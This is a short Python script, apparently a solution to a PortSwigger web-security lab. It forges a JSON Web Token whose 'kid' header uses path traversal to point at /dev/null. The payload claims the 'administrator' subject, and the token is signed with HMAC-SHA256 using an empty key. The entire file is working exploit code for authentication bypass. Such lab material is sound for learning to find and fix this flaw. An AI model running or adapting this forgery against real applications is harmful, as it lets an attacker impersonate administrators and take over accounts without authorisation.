import hmac
import hashlib
import base64

# Transforms string to base64 string
def b64(string): return base64.urlsafe_b64encode(string).decode().rstrip('=')

# Forge header with kid pointing to /dev/null via path traversal
header = '{"kid":"../../../../../../../dev/null","alg":"HS256"}'

# Forge payload with sub=administrator
payload = '{"iss":"portswigger","exp":1773401894,"sub":"administrator"}'

# Put together the message part of the JWT
message = f"{b64(header.encode())}.{b64(payload.encode())}"

# Sign with empty string (the content of /dev/null)
signature = b64(hmac.new(b'', message.encode(), hashlib.sha256).digest())

forged_jwt = f"{message}.{signature}"

print(forged_jwt)
